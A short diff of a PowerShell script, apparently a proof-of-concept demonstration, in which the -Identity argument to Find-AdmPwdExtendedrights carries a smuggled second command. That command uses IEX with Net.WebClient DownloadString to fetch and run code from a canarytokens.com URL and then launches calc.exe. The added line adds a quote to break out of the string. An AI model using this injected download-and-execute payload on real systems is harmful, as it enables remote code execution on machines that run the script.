@@ -110,7 +110,7 @@ This comment is very important
 to get the right number of byteswxxxxxxxxxxxxxxxx
 XXXXXXXXXXXXXXXXXXXXXXXx
 #>
-$rights = Find-AdmPwdExtendedrights -Identity "<span class="modified">;$(IEX (New-Object Net.WebClient).DownloadString('http://canarytokens.com/terms/static/stuff/h608qpmsix4altl2cw3d41iza/post.jsp'); Start-Process calc.exe)</span>" 
+$rights = Find-AdmPwdExtendedrights -Identity "<span class="modified">";$(IEX (New-Object Net.WebClient).DownloadString('http://canarytokens.com/terms/static/stuff/h608qpmsix4altl2cw3d41iza/post.jsp'); Start-Process calc.exe)</span>" 
 $rights | Format-Table 
 
 #ShadowNotSoBroker
